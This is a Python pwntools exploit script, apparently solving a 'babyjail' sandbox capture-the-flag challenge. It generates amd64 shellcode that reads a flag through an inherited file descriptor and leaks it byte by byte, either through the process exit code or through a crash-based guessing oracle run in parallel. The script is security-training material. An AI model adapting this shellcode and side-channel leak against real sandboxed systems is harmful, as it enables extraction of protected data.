#!/usr/bin/env python3

from pwn import *
import multiprocessing

def payload_gen_lv10(offset):
    read_addr = 0x01337200
    exit_val_addr = read_addr + offset
    assembly_code = f'''
    mov rdi, 3
    mov rsi, {read_addr}
    mov rdx, 0x50
    mov rax, 0
    syscall
    mov dil, BYTE PTR [{exit_val_addr}]
    mov rax, 60
    syscall
    '''
    print(assembly_code)
    shellcode = asm(assembly_code, arch='amd64')
    formatted_shellcode = ''.join('\\x{:02x}'.format(byte) for byte in shellcode)
    print('Formatted Shellcode:')
    print(formatted_shellcode)
    return shellcode

def payload_gen_lv12(offset, guess_byte):
    read_addr = 0x01337200
    target_addr = read_addr + offset

    assembly_code = f'''
    mov rdi, 3
    mov rsi, {read_addr}
    mov rdx, 0x50
    mov rax, 0
    syscall
    mov al, BYTE PTR [{target_addr}]
    cmp al, {guess_byte}
    je end
    mov rax, 60
    syscall
    end:
        nop
    '''

    shellcode = asm(assembly_code, arch='amd64')
    return shellcode

def leak_by_exit(bin_argv):
    flag = ''
    offset = 0
    while True:
        p = process(bin_argv)
        p.readuntil('Reading 0x1000 bytes of shellcode from stdin.\n\n')

        payload = payload_gen_lv10(offset)
        offset = offset + 1
        p.sendline(payload)

        p.wait()
        cur_byte = chr(p.poll())
        flag = flag + cur_byte
        print(flag)
        if(cur_byte == '}'):
            break

def leak_by_read(bin_argv):
    flag = ''
    offset = 12
    while True:
        cur_byte = ''
        for b in range(0, 256):
            p = process(bin_argv)
            print(b)
            payload = payload_gen_lv12(offset, b)
            p.sendline(payload)

            p.wait()
            exit_num = p.poll()
            print(exit_num)
            
            if(exit_num == -11):
                cur_byte = chr(b)
                flag = flag + cur_byte
                break
        
        print(flag)
        if(cur_byte == '}'):
            break

        offset = offset + 1

def leak_by_read_multi_proc(bin_argv, l, r):
    flag = ''
    for offset in range(l, r):
        cur_byte = ''
        for b in range(0, 256):
            p = process(bin_argv)
            print(b)
            payload = payload_gen_lv12(offset, b)
            p.sendline(payload)

            p.wait()
            exit_num = p.poll()
            print(exit_num)
            
            if(exit_num == -11):
                cur_byte = chr(b)
                flag = flag + cur_byte
                break
        
        print(flag)
        if(cur_byte == '}'):
            break

    return flag

def run_in_parallel(argv):
    parameters = [
        (argv,  0,  5), (argv,  5, 10), (argv, 10, 15), 
        (argv, 15, 20), (argv, 20, 25), (argv, 25, 30), 
        (argv, 30, 35), (argv, 35, 40), (argv, 40, 45), 
        (argv, 45, 50), (argv, 50, 55), (argv, 55, 60)
    ]

    with multiprocessing.Pool() as pool:
        results = pool.starmap(leak_by_read_multi_proc, parameters)
    return results

# print(run_in_parallel(['/challenge/babyjail_level11', '/flag']))
